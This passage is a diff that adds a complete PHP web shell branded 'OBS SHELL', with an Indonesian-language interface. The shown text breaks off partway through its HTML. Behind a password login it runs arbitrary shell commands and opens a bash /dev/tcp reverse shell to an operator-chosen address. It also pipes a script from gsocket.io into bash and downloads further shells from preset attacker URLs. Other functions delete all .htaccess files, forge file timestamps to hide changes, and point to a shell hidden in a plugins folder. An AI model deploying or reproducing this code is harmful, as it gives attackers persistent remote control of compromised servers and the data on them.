@@ -1,0 +1,1633 @@
+    <?php
+    error_reporting(E_ALL);
+    ini_set('display_errors', 1);
+
+    // ================== KONFIGURASI ==================
+    $CONFIG_ROOT   = '/';
+    $PASSWORD_HASH = '$2a$12$dD.n3Zd36D.G.TZI5/tapeS882vl.8zD5O6ZTYvW0NJvkNPDzFMR2';
+    $AUTH_COOKIE   = 'fm_auth_token';
+    $TOKEN_EXPIRY  = 60 * 60 * 24 * 30;
+
+    // HOME SHELL PATH
+    $HOME_SHELL = 'plugins/generic/controlPublicFiles/naskleng.php';
+
+    // Theme
+    $theme = $_COOKIE['obs_theme'] ?? 'dark';
+    $allowed_themes = ['dark', 'matrix', 'light'];
+    if (!in_array($theme, $allowed_themes)) $theme = 'dark';
+
+    if (isset($_GET['set_theme'])) {
+        setcookie('obs_theme', $_GET['set_theme'], time() + 86400 * 30, '/');
+        header("Location: " . strtok($_SERVER['PHP_SELF'], '?'));
+        exit;
+    }
+
+    // ================== FUNGSI CORE ==================
+    function cleanPath($path) {
+        if ($path === null || $path === '') return getcwd();
+        $path = str_replace(['\\', '..', './'], ['/', '', '/'], $path);
+        $path = preg_replace('#/+#', '/', $path);
+        if (strpos($path, '/../') !== false || strpos($path, '..') === 0) return getcwd();
+        if (!empty($path) && !is_dir($path) && !is_file($path)) {
+            $parent = dirname($path);
+            if (is_dir($parent)) return $parent;
+            return getcwd();
+        }
+        return $path ?: getcwd();
+    }
+
+    function is_authenticated() {
+        global $AUTH_COOKIE, $PASSWORD_HASH;
+        if (!isset($_COOKIE[$AUTH_COOKIE])) return false;
+        $token = $_COOKIE[$AUTH_COOKIE];
+        $decoded = base64_decode($token);
+        if ($decoded === false || strpos($decoded, '|') === false) return false;
+        list($expiry, $hash) = explode('|', $decoded, 2);
+        if (time() > $expiry) return false;
+        $expected_hash = hash_hmac('sha256', $expiry, $PASSWORD_HASH);
+        return hash_equals($expected_hash, $hash);
+    }
+
+    function set_auth_cookie() {
+        global $AUTH_COOKIE, $PASSWORD_HASH, $TOKEN_EXPIRY;
+        $expiry = time() + $TOKEN_EXPIRY;
+        $hash = hash_hmac('sha256', $expiry, $PASSWORD_HASH);
+        $token = base64_encode($expiry . '|' . $hash);
+        setcookie($AUTH_COOKIE, $token, $expiry, '/', '', false, true);
+    }
+
+    function clear_auth_cookie() {
+        global $AUTH_COOKIE;
+        setcookie($AUTH_COOKIE, '', time() - 3600, '/');
+    }
+
+    function destroy_dir($dir) {
+        if (!is_dir($dir) || is_link($dir)) return @unlink($dir);
+        foreach (scandir($dir) as $file) {
+            if ($file == '.' || $file == '..') continue;
+            if (!destroy_dir($dir . DIRECTORY_SEPARATOR . $file)) {
+                @chmod($dir . DIRECTORY_SEPARATOR . $file, 0777);
+                if (!destroy_dir($dir . DIRECTORY_SEPARATOR . $file)) return false;
+            }
+        }
+        return @rmdir($dir);
+    }
+
+    function customSort($a, $b) {
+        $isDirA = is_dir($a['fullpath']);
+        $isDirB = is_dir($b['fullpath']);
+        if ($isDirA && !$isDirB) return -1;
+        if (!$isDirA && $isDirB) return 1;
+        return strcasecmp($a['name'], $b['name']);
+    }
+
+    function formatSize($bytes) {
+        if ($bytes >= 1073741824) return round($bytes/1073741824, 2) . ' GB';
+        if ($bytes >= 1048576) return round($bytes/1048576, 2) . ' MB';
+        if ($bytes >= 1024) return round($bytes/1024, 2) . ' KB';
+        return $bytes . ' B';
+    }
+
+    function zip_paths($paths, $zipFile, &$messages) {
+        if (!class_exists('ZipArchive')) { $messages[] = "ZipArchive tidak ada"; return false; }
+        $zip = new ZipArchive();
+        if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) return false;
+        foreach ($paths as $p) {
+            if (is_dir($p)) {
+                $base = basename($p);
+                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+                foreach ($it as $file) {
+                    $relPath = $base . '/' . substr($file->getPathname(), strlen($p) + 1);
+                    if ($file->isDir()) $zip->addEmptyDir($relPath);
+                    else $zip->addFile($file->getPathname(), $relPath);
+                }
+            } elseif (is_file($p)) {
+                $zip->addFile($p, basename($p));
+            }
+        }
+        $zip->close();
+        return true;
+    }
+
+    function send_download($path, $downloadName) {
+        if (!file_exists($path)) return false;
+        ob_clean();
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . $downloadName . '"');
+        header('Content-Length: ' . filesize($path));
+        readfile($path);
+        return true;
+    }
+
+    function create_in_dirs_recursive($baseDirs, $name, $content, &$messages) {
+        $created = 0;
+        foreach ($baseDirs as $dirPath) {
+            if (!is_dir($dirPath)) continue;
+            $dest = rtrim($dirPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
+            if (!file_exists($dest) && file_put_contents($dest, $content)) {
+                $messages[] = "✅ Created: $dest";
+                $created++;
+            }
+        }
+        return $created;
+    }
+
+    $presets = [
+        'ALFA ONI' => 'https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/obs1.txt',
+        'ALFA OBS' => 'https://obeydasupreme.site/shell/obs1.txt',
+        'TINY' => 'https://obeydasupreme.site/shell/obstiny.txt',
+        'GECKO' => 'https://obeydasupreme.site/shell/obsgecko.txt',
+    ];
+
+    // ================== LOGIN ==================
+    $error = '';
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fm_login_pass'])) {
+        $pass = (string)($_POST['fm_login_pass']);
+        if (password_verify($pass, $PASSWORD_HASH)) {
+            set_auth_cookie();
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error = "Password salah.";
+        }
+    }
+
+    if (isset($_GET['logout'])) {
+        clear_auth_cookie();
+        header("Location: " . strtok($_SERVER['PHP_SELF'], '?'));
+        exit;
+    }
+
+    $isAuth = is_authenticated();
+
+    if (!$isAuth) {
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>OBS SHELL | Login</title>
+            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+            <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body {
+                    background: linear-gradient(135deg, #0f172a 0%, #020617 100%);
+                    font-family: 'Inter', sans-serif;
+                    min-height: 100vh;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                }
+                .login-container {
+                    background: rgba(15, 23, 42, 0.8);
+                    backdrop-filter: blur(20px);
+                    border-radius: 32px;
+                    border: 1px solid rgba(56, 189, 248, 0.2);
+                    padding: 48px 40px;
+                    width: 420px;
+                }
+                .logo-icon { width: 56px; height: 56px; background: linear-gradient(135deg, #38bdf8, #0ea5e9); border-radius: 18px; margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; font-size: 32px; }
+                h2 { color: #f1f5f9; font-size: 28px; text-align: center; margin-bottom: 8px; }
+                .sub { color: #94a3b8; font-size: 16px; text-align: center; margin-bottom: 32px; }
+                input { width: 100%; padding: 14px 18px; background: rgba(2,6,23,0.8); border: 1px solid #1e293b; border-radius: 14px; color: #e2e8f0; font-size: 16px; }
+                button { width: 100%; padding: 14px; background: linear-gradient(135deg, #38bdf8, #0ea5e9); border: none; border-radius: 14px; color: white; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 16px; }
+                .error { color: #f87171; font-size: 14px; text-align: center; margin-top: 16px; }
+            </style>
+        </head>
+        <body>
+            <div class="login-container">
+                <div class="logo-icon">⚡</div>
+                <h2>OBS SHELL</h2>
+                <div class="sub">Ultimate Working</div>
+                <form method="post">
+                    <input type="password" name="fm_login_pass" placeholder="Enter password" autofocus>
+                    <button type="submit">Access Panel →</button>
+                    <?php if ($error): ?>
+                        <div class="error"><?php echo htmlspecialchars($error); ?></div>
+                    <?php endif; ?>
+                </form>
+            </div>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
+
+    // ================== MAIN LOGIC ==================
+    $pwd = isset($_GET['pwd']) ? cleanPath($_GET['pwd']) : getcwd();
+    $messages = [];
+    $parent = dirname($pwd);
+
+    // Handle POST
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $action = $_POST['action'] ?? '';
+        
+        if ($action === 'mass_delete') {
+            foreach (($_POST['file_targets'] ?? []) as $f) {
+                $path = $pwd . DIRECTORY_SEPARATOR . basename($f);
+                if (is_file($path) && @unlink($path)) $messages[] = "✅ Deleted: $f";
+            }
+            foreach (($_POST['dir_targets'] ?? []) as $d) {
+                if (is_dir($d) && destroy_dir($d)) $messages[] = "✅ Deleted dir: " . basename($d);
+            }
+        }
+        elseif ($action === 'delete_htaccess_all') {
+            $stack = [$pwd];
+            $count = 0;
+            while ($stack) {
+                $cur = array_pop($stack);
+                $htaccess = $cur . DIRECTORY_SEPARATOR . '.htaccess';
+                if (file_exists($htaccess) && @unlink($htaccess)) $count++;
+                $items = @scandir($cur);
+                if ($items) foreach ($items as $it) {
+                    if ($it === '.' || $it === '..') continue;
+                    $child = $cur . DIRECTORY_SEPARATOR . $it;
+                    if (is_dir($child)) $stack[] = $child;
+                }
+            }
+            $messages[] = "✅ Deleted $count .htaccess files";
+        }
+        elseif ($action === 'create_file_single') {
+            $name = basename($_POST['new_file_name'] ?? '');
+            $content = $_POST['new_file_content'] ?? '';
+            if ($name) {
+                $path = $pwd . DIRECTORY_SEPARATOR . $name;
+                if (!file_exists($path) && file_put_contents($path, $content)) {
+                    $messages[] = "✅ Created: $name";
+                } else {
+                    $messages[] = "❌ Failed to create: $name";
+                }
+            }
+        }
+        elseif ($action === 'create_file_recursive') {
+            $name = basename($_POST['new_file_name_rec'] ?? '');
+            $content = $_POST['new_file_content_rec'] ?? '';
+            $dirs = $_POST['dir_targets'] ?? [];
+            if ($name && $dirs) {
+                $created = create_in_dirs_recursive($dirs, $name, $content, $messages);
+                if ($created == 0) $messages[] = "❌ No files created. Make sure you selected folders!";
+            } elseif ($name && empty($dirs)) {
+                $messages[] = "❌ Please select at least one folder for recursive creation!";
+            }
+        }
+        elseif ($action === 'create_folder') {
+            $name = basename($_POST['new_folder_name'] ?? '');
+            if ($name && @mkdir($pwd . DIRECTORY_SEPARATOR . $name, 0777)) {
+                $messages[] = "✅ Folder created: $name";
+            }
+        }
+        elseif ($action === 'edit_save') {
+            $file = basename($_POST['edit_file'] ?? '');
+            $content = $_POST['file_content'] ?? '';
+            $path = $pwd . DIRECTORY_SEPARATOR . $file;
+            if (file_put_contents($path, $content)) $messages[] = "✅ Saved: $file";
+        }
+        elseif ($action === 'deploy_upload' && isset($_FILES['src_file'])) {
+            $target = basename($_POST['target_name_upload'] ?? '');
+            if ($target && move_uploaded_file($_FILES['src_file']['tmp_name'], $pwd . DIRECTORY_SEPARATOR . $target)) {
+                $messages[] = "✅ Uploaded: $target";
+            }
+        }
+        elseif ($action === 'deploy_url') {
+            $url = trim($_POST['src_url'] ?? '');
+            $target = basename($_POST['target_name_url'] ?? '');
+            if ($url && $target) {
+                $data = @file_get_contents($url);
+                if ($data && file_put_contents($pwd . DIRECTORY_SEPARATOR . $target, $data)) {
+                    $messages[] = "✅ Downloaded: $target";
+                }
+            }
+        }
+        elseif ($action === 'chmod_apply') {
+            $mode = octdec(trim($_POST['chmod_mode'] ?? '0755'));
+            foreach (($_POST['file_targets'] ?? []) as $f) {
+                $path = $pwd . DIRECTORY_SEPARATOR . basename($f);
+                if (@chmod($path, $mode)) $messages[] = "✅ Chmod: $f";
+            }
+        }
+        elseif ($action === 'time_apply') {
+            $ts = strtotime($_POST['time_value'] ?? '');
+            if ($ts) {
+                foreach (($_POST['file_targets'] ?? []) as $f) {
+                    @touch($pwd . DIRECTORY_SEPARATOR . basename($f), $ts);
+                }
+                $messages[] = "✅ Time updated";
+            }
+        }
+        elseif ($action === 'zip_selected') {
+            $paths = [];
+            foreach (($_POST['file_targets'] ?? []) as $f) {
+                $p = $pwd . DIRECTORY_SEPARATOR . basename($f);
+                if (file_exists($p)) $paths[] = $p;
+            }
+            foreach (($_POST['dir_targets'] ?? []) as $d) {
+                if (is_dir($d)) $paths[] = $d;
+            }
+            if ($paths) {
+                $zipName = 'download_' . date('Ymd_His') . '.zip';
+                $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;
+                if (zip_paths($paths, $zipPath, $messages)) {
+                    send_download($zipPath, $zipName);
+                    @unlink($zipPath);
+                    exit;
+                }
+            }
+        }
+    }
+
+    // Handle AJAX
+    if (isset($_GET['ajax'])) {
+        header('Content-Type: application/json');
+        
+        if ($_GET['ajax'] === 'terminal') {
+            $cmd = $_POST['cmd'] ?? '';
+            if ($cmd) {
+                $fullCmd = 'cd ' . escapeshellarg($pwd) . ' && ' . $cmd . ' 2>&1';
+                $output = shell_exec($fullCmd) ?: "[No output]";
+                echo json_encode(['output' => $output]);
+            } else {
+                echo json_encode(['output' => '']);
+            }
+            exit;
+        }
+        
+        if ($_GET['ajax'] === 'get_file') {
+            $file = basename($_GET['file'] ?? '');
+            $path = $pwd . DIRECTORY_SEPARATOR . $file;
+            if (is_file($path) && is_readable($path)) {
+                echo json_encode(['content' => file_get_contents($path)]);
+            } else {
+                echo json_encode(['content' => '', 'error' => 'Cannot read file']);
+            }
+            exit;
+        }
+        
+        if ($_GET['ajax'] === 'save_file') {
+            $file = basename($_POST['file'] ?? '');
+            $content = $_POST['content'] ?? '';
+            $path = $pwd . DIRECTORY_SEPARATOR . $file;
+            if (file_put_contents($path, $content)) {
+                echo json_encode(['success' => true, 'message' => 'File saved']);
+            } else {
+                echo json_encode(['success' => false, 'message' => 'Cannot save file']);
+            }
+            exit;
+        }
+        
+        if ($_GET['ajax'] === 'upload_file' && isset($_FILES['file'])) {
+            $target = basename($_POST['target'] ?? '');
+            if ($target && move_uploaded_file($_FILES['file']['tmp_name'], $pwd . DIRECTORY_SEPARATOR . $target)) {
+                echo json_encode(['success' => true, 'message' => "Uploaded: $target"]);
+            } else {
+                echo json_encode(['success' => false, 'message' => 'Upload failed']);
+            }
+            exit;
+        }
+        
+        if ($_GET['ajax'] === 'deploy_url') {
+            $url = $_POST['url'] ?? '';
+            $target = basename($_POST['target'] ?? '');
+            if ($url && $target) {
+                $data = @file_get_contents($url);
+                if ($data && file_put_contents($pwd . DIRECTORY_SEPARATOR . $target, $data)) {
+                    echo json_encode(['success' => true, 'message' => "Downloaded: $target"]);
+                } else {
+                    echo json_encode(['success' => false, 'message' => 'Download failed']);
+                }
+            } else {
+                echo json_encode(['success' => false, 'message' => 'URL and target required']);
+            }
+            exit;
+        }
+        
+        if ($_GET['ajax'] === 'chmod') {
+            $mode = octdec($_POST['mode'] ?? '0755');
+            $files = json_decode($_POST['files'] ?? '[]', true);
+            foreach ($files as $f) {
+                $path = $pwd . DIRECTORY_SEPARATOR . basename($f);
+                @chmod($path, $mode);
+            }
+            echo json_encode(['success' => true, 'message' => 'Chmod applied']);
+            exit;
+        }
+        
+        if ($_GET['ajax'] === 'modify_time') {
+            $ts = strtotime($_POST['time'] ?? '');
+            $files = json_decode($_POST['files'] ?? '[]', true);
+            if ($ts) {
+                foreach ($files as $f) {
+                    $path = $pwd . DIRECTORY_SEPARATOR . basename($f);
+                    @touch($path, $ts);
+                }
+                echo json_encode(['success' => true, 'message' => 'Time updated']);
+            } else {
+                echo json_encode(['success' => false, 'message' => 'Invalid time format']);
+            }
+            exit;
+        }
+        
+        if ($_GET['ajax'] === 'reverse_shell') {
+            $ip = $_POST['ip'] ?? '';
+            $port = $_POST['port'] ?? '';
+            if ($ip && $port) {
+                $cmd = "bash -c \"exec 5<>/dev/tcp/{$ip}/{$port}; cat <&5 | while read line; do \$line 2>&5 >&5; done\" &";
+                @shell_exec($cmd);
+                echo json_encode(['success' => true, 'message' => "Reverse shell sent to $ip:$port"]);
+            } else {
+                echo json_encode(['success' => false, 'message' => 'IP and Port required']);
+            }
+            exit;
+        }
+        
+        if ($_GET['ajax'] === 'gsocket') {
+            $cmd = 'curl -fsSL https://gsocket.io/y | tr -d "\r" | bash 2>&1';
+            $output = shell_exec($cmd);
+            echo json_encode(['success' => true, 'message' => 'GSocket executed', 'output' => $output]);
+            exit;
+        }
+        
+        exit;
+    }
+
+    // Baca folder
+    $items = [];
+    if ($scan = @scandir($pwd)) {
+        foreach ($scan as $it) {
+            if ($it === '.' || $it === '..') continue;
+            $items[] = ['name' => $it, 'fullpath' => $pwd . DIRECTORY_SEPARATOR . $it];
+        }
+        usort($items, 'customSort');
+    }
+
+    // Info Server
+    $uname = php_uname();
+    $userName = function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'n/a') : 'n/a';
+    $phpVersion = PHP_VERSION;
+    $serverIp = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
+    $yourIp = $_SERVER['REMOTE_ADDR'] ?? 'CLI';
+    $dateTime = date('Y-m-d H:i:s');
+    $diskTotal = disk_total_space('/') ? round(disk_total_space('/') / 1024 / 1024 / 1024, 2) : 0;
+    $diskFree = disk_free_space('/') ? round(disk_free_space('/') / 1024 / 1024 / 1024, 2) : 0;
+    $software = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';
+    $curlOn = function_exists('curl_version') ? 'ON' : 'OFF';
+    $ssh2On = function_exists('ssh2_connect') ? 'ON' : 'OFF';
+    $mysqlOn = function_exists('mysqli_connect') ? 'ON' : 'OFF';
+
+    $breadcrumb = '';
+    $pathParts = explode('/', trim($pwd, '/'));
+    $currentPath = '';
+    foreach ($pathParts as $part) {
+        if (empty($part)) continue;
+        $currentPath .= '/' . $part;
+        $breadcrumb .= '<a href="?pwd=' . urlencode($currentPath) . '" class="breadcrumb-link">' . htmlspecialchars($part) . '</a> / ';
+    }
+    $breadcrumb = rtrim($breadcrumb, ' / ');
+    if (empty($breadcrumb)) $breadcrumb = '/';
+    ?>
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>OBS SHELL · Ultimate Working</title>
+        <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+        
+        <style>
+            /* DARK THEME (default) */
+            :root {
+                --bg: #0f172a;
+                --card: #1e293b;
+                --border: #334155;
+                --accent: #38bdf8;
+                --text: #f1f5f9;
+                --text-dim: #94a3b8;
+                --danger: #ef4444;
+                --success: #22c55e;
+                --input-bg: #0f172a;
+            }
+            
+            /* LIGHT THEME */
+            body.light {
+                --bg: #f1f5f9;
+                --card: #ffffff;
+                --border: #e2e8f0;
+                --accent: #3b82f6;
+                --text: #1e293b;
+                --text-dim: #64748b;
+                --danger: #ef4444;
+                --success: #22c55e;
+                --input-bg: #ffffff;
+            }
+            
+            /* MATRIX THEME */
+            body.matrix {
+                --bg: #0a0f0a;
+                --card: #0a1a0a;
+                --border: #1a3a1a;
+                --accent: #00ff00;
+                --text: #00ff00;
+                --text-dim: #30cc30;
+                --danger: #ff4444;
+                --success: #44ff44;
+                --input-bg: #0a0f0a;
+            }
+            
+            body.matrix, body.matrix button, body.matrix input, body.matrix .btn {
+                font-family: 'Courier New', monospace;
+            }
+            
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+                background: var(--bg);
+                font-family: 'Inter', sans-serif;
+                color: var(--text);
+                padding: 24px;
+                font-size: 15px;
+            }
+            .container { max-width: 1400px; margin: 0 auto; }
+            
+            .header {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                margin-bottom: 28px;
+                flex-wrap: wrap;
+                gap: 16px;
+            }
+            .logo {
+                font-size: 28px;
+                font-weight: 700;
+                background: linear-gradient(135deg, var(--accent), var(--text));
+                -webkit-background-clip: text;
+                background-clip: text;
+                color: transparent;
+            }
+            .theme-btn {
+                background: var(--card);
+                border: 1px solid var(--border);
+                border-radius: 10px;
+                padding: 8px 16px;
+                font-size: 14px;
+                cursor: pointer;
+                color: var(--text);
+            }
+            .theme-btn:hover { background: var(--accent); color: #fff; }
+            
+            .card {
+                background: var(--card);
+                border-radius: 20px;
+                border: 1px solid var(--border);
+                margin-bottom: 24px;
+                overflow: hidden;
+            }
+            .card-header {
+                padding: 16px 20px;
+                background: rgba(0,0,0,0.2);
+                border-bottom: 1px solid var(--border);
+            }
+            .card-title {
+                font-size: 16px;
+                font-weight: 600;
+                color: var(--accent);
+            }
+            .card-body { padding: 20px; }
+            
+            .info-grid {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+                gap: 12px;
+                margin-bottom: 20px;
+            }
+            .info-box {
+                background: var(--input-bg);
+                border-radius: 12px;
+                padding: 12px 14px;
+                border: 1px solid var(--border);
+            }
+            .info-label { font-size: 11px; text-transform: uppercase; color: var(--text-dim); margin-bottom: 5px; }
+            .info-value { font-size: 14px; font-family: monospace; word-break: break-all; }
+            
+            .breadcrumb {
+                background: var(--input-bg);
+                border-radius: 12px;
+                padding: 12px 16px;
+                margin-bottom: 20px;
+                font-size: 14px;
+                font-family: monospace;
+                border: 1px solid var(--border);
+                cursor: pointer;
+            }
+            .breadcrumb-link { color: var(--accent); text-decoration: none; font-size: 14px; }
+            
+            .file-table {
+                width: 100%;
+                border-collapse: collapse;
+                font-size: 14px;
+            }
+            .file-table th {
+                text-align: left;
+                padding: 12px 8px;
+                font-size: 12px;
+                color: var(--text-dim);
+                border-bottom: 1px solid var(--border);
+            }
+            .file-table td {
+                padding: 10px 8px;
+                border-bottom: 1px solid var(--border);
+                font-size: 14px;
+            }
+            .folder-link { color: var(--accent); text-decoration: none; font-size: 14px; }
+            
+            input, textarea, select {
+                background: var(--input-bg);
+                border: 1px solid var(--border);
+                border-radius: 10px;
+                padding: 10px 14px;
+                color: var(--text);
+                font-size: 14px;
+            }
+            .btn {
+                background: var(--input-bg);
+                border: 1px solid var(--border);
+                border-radius: 10px;
+                padding: 8px 14px;
+                color: var(--text);
+                font-size: 13px;
+                cursor: pointer;
+                display: inline-flex;
+                align-items: center;
+                gap: 8px;
+            }
+            .btn-primary { background: var(--accent); border-color: var(--accent); color: #fff; }
+            .btn-danger { border-color: var(--danger); color: var(--danger); }
+            .btn-danger:hover { background: var(--danger); color: #fff; }
+            
+            .flex { display: flex; gap: 12px; flex-wrap: wrap; align-items: center; }
+            .flex-between { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
+            .grid-2 { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
+            hr { border-color: var(--border); margin: 16px 0; }
+            .badge { background: var(--input-bg); padding: 4px 10px; border-radius: 12px; font-size: 12px; border: 1px solid var(--border); }
+            
+            .modal {
+                display: none;
+                position: fixed;
+                z-index: 1000;
+                left: 0;
+                top: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.85);
+            }
+            .modal-content {
+                background: var(--card);
+                margin: 5% auto;
+                padding: 24px;
+                width: 85%;
+                max-width: 900px;
+                border-radius: 24px;
+                border: 1px solid var(--accent);
+                max-height: 85%;
+                overflow: auto;
+            }
+            .modal-small {
+                max-width: 500px;
+            }
+            .modal-header {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                margin-bottom: 20px;
+                padding-bottom: 12px;
+                border-bottom: 1px solid var(--border);
+            }
+            .modal-title {
+                font-size: 22px;
+                font-weight: 600;
+                color: var(--accent);
+            }
+            .close-modal {
+                font-size: 32px;
+                cursor: pointer;
+                color: var(--text-dim);
+            }
+            .close-modal:hover { color: var(--danger); }
+            
+            .code-editor {
+                width: 100%;
+                min-height: 400px;
+                font-family: 'Courier New', monospace;
+                font-size: 14px;
+                background: var(--input-bg);
+                border: 1px solid var(--border);
+                border-radius: 12px;
+                padding: 14px;
+                color: var(--text);
+            }
+            
+            .terminal-output {
+                background: var(--input-bg);
+                border-radius: 12px;
+                padding: 14px;
+                font-family: monospace;
+                font-size: 13px;
+                white-space: pre-wrap;
+                max-height: 300px;
+                overflow: auto;
+                margin-bottom: 16px;
+                border: 1px solid var(--border);
+            }
+            
+            .toast-notify {
+                position: fixed;
+                bottom: 30px;
+                right: 30px;
+                background: var(--accent);
+                color: #fff;
+                padding: 14px 24px;
+                border-radius: 12px;
+                font-size: 15px;
+                font-weight: 500;
+                z-index: 10000;
+                animation: slideIn 0.3s ease, fadeOut 3s ease forwards;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            }
+            @keyframes slideIn {
+                from { transform: translateX(100%); opacity: 0; }
+                to { transform: translateX(0); opacity: 1; }
+            }
+            @keyframes fadeOut {
+                0% { opacity: 1; }
+                70% { opacity: 1; }
+                100% { opacity: 0; visibility: hidden; }
+            }
+            
+            @media (max-width: 900px) {
+                body { padding: 16px; }
+                .grid-2 { grid-template-columns: 1fr; }
+            }
+        </style>
+    </head>
+    <body class="<?php echo $theme; ?>">
+    <div class="container">
+        <div class="header">
+            <div class="logo">⚡ OBS SHELL <span style="font-size: 16px;">Ultimate</span></div>
+            <div class="flex">
+                <div class="theme-btn" onclick="setTheme('dark')">🌙 Dark</div>
+                <div class="theme-btn" onclick="setTheme('matrix')">💚 Matrix</div>
+                <div class="theme-btn" onclick="setTheme('light')">☀️ Light</div>
+                <a href="?logout=1" class="btn btn-danger">Logout</a>
+            </div>
+        </div>
+        
+        <!-- FILE MANAGER CARD -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-title"><i class="fas fa-folder"></i> FILE MANAGER</div>
+                <div class="flex">
+                    <a href="?pwd=<?php echo urlencode($parent); ?>" class="btn"><i class="fas fa-level-up-alt"></i> Up</a>
+                    <a href="?pwd=<?php echo urlencode($HOME_SHELL); ?>" class="btn btn-primary"><i class="fas fa-home"></i> Home Shell</a>
+                    <input type="text" id="gotoPath" placeholder="/path" style="width: 200px;">
+                    <button class="btn" onclick="location.href='?pwd='+encodeURIComponent(document.getElementById('gotoPath').value)">Go</button>
+                    <button class="btn btn-primary" onclick="openTerminalModal()"><i class="fas fa-terminal"></i> Terminal</button>
+                </div>
+            </div>
+            <div class="card-body">
+                <!-- INFO GRID -->
+                <div class="info-grid">
+                    <div class="info-box"><div class="info-label">Uname</div><div class="info-value"><?php echo substr($uname,0,45); ?></div></div>
+                    <div class="info-box"><div class="info-label">User</div><div class="info-value"><?php echo $userName; ?></div></div>
+                    <div class="info-box"><div class="info-label">PHP</div><div class="info-value"><?php echo $phpVersion; ?></div></div>
+                    <div class="info-box"><div class="info-label">Server IP / My IP</div><div class="info-value"><?php echo $serverIp; ?> / <?php echo $yourIp; ?></div></div>
+                    <div class="info-box"><div class="info-label">DateTime</div><div class="info-value"><?php echo $dateTime; ?></div></div>
+                    <div class="info-box"><div class="info-label">HDD</div><div class="info-value"><?php echo $diskFree; ?>GB / <?php echo $diskTotal; ?>GB</div></div>
+                    <div class="info-box"><div class="info-label">Software</div><div class="info-value"><?php echo substr($software,0,35); ?></div></div>
+                    <div class="info-box"><div class="info-label">Modules</div><div class="info-value">C:<?php echo $curlOn; ?> S:<?php echo $ssh2On; ?> M:<?php echo $mysqlOn; ?></div></div>
+                </div>
+                
+                <!-- BREADCRUMB -->
+                <div class="breadcrumb" onclick="copyToClipboard('<?php echo htmlspecialchars($pwd); ?>')">
+                    <i class="fas fa-location-dot"></i> <?php echo $breadcrumb; ?>
+                    <i class="fas fa-copy" style="margin-left: 10px; opacity: 0.6;"></i>
+                    <span style="font-size: 12px;">(klik copy path)</span>
+                </div>
+                
+                <!-- CREATE FILE, FOLDER, UPLOAD, DEPLOY URL -->
+                <div class="card-title" style="font-size: 14px; margin-bottom: 12px;">📁 File Operations</div>
+                <div class="grid-2">
+                    <div>
+                        <div class="flex" style="margin-bottom: 12px;">
+                            <input type="text" id="newFileName" placeholder="filename.php" style="flex: 2;">
+                            <button class="btn btn-primary" onclick="showCreateFileOptions()">Create File</button>
+                        </div>
+                        <div class="flex">
+                            <input type="text" id="newFolderName" placeholder="folder_name" style="flex: 2;">
+                            <button class="btn btn-primary" onclick="createNewFolder()">Create Folder</button>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="flex" style="margin-bottom: 12px;">
+                            <input type="file" id="uploadFile" style="flex: 2;">
+                            <input type="text" id="uploadTarget" placeholder="save as" style="width: 120px;">
+                            <button class="btn btn-primary" onclick="uploadFile()">Upload</button>
+                        </div>
+                        <div class="flex">
+                            <input type="text" id="deployUrl" placeholder="https://..." style="flex: 2;">
+                            <input type="text" id="deployTarget" placeholder="filename" style="width: 120px;">
+                            <button class="btn btn-primary" onclick="deployUrl()">Download URL</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <hr>
+                
+                <!-- FILE TABLE - DENGAN KOLOM LENGKAP -->
+                <form id="mainForm" method="post">
+                    <table class="file-table">
+                        <thead>
+                            <tr>
+                                <th style="width: 35px;"><input type="checkbox" id="selectAll" style="width: 18px; height: 18px;"></th>
+                                <th>Name</th>
+                                <th>Size</th>
+                                <th>Perm</th>
+                                <th>Owner:Group</th>
+                                <th>Modified</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <?php foreach ($items as $item):
+                                $full = $item['fullpath'];
+                                $name = $item['name'];
+                                $isDir = is_dir($full);
+                                $perm = substr(sprintf('%o', fileperms($full)), -4);
+                                $size = $isDir ? '📁' : formatSize(filesize($full));
+                                
+                                // Get owner and group
+                                $ownerId = fileowner($full);
+                                $groupId = filegroup($full);
+                                $ownerName = function_exists('posix_getpwuid') ? (posix_getpwuid($ownerId)['name'] ?? $ownerId) : $ownerId;
+                                $groupName = function_exists('posix_getgrgid') ? (posix_getgrgid($groupId)['name'] ?? $groupId) : $groupId;
